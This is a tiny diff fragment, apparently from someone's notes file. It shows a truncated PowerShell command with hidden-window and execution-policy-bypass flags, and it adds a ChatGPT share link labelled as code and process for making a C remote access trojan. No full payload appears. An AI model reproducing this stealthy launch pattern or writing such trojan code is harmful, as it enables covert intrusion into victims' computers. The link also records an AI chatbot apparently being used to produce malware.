@@ -6,3 +6,4 @@ powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy B
 
 
 https://chatgpt.com/share/91b98844-f123-4386-9c60-9b99edfab481
+https://chatgpt.com/share/66fd291e-c778-800f-9696-45e171e1141d =====> code and process to make c rat 
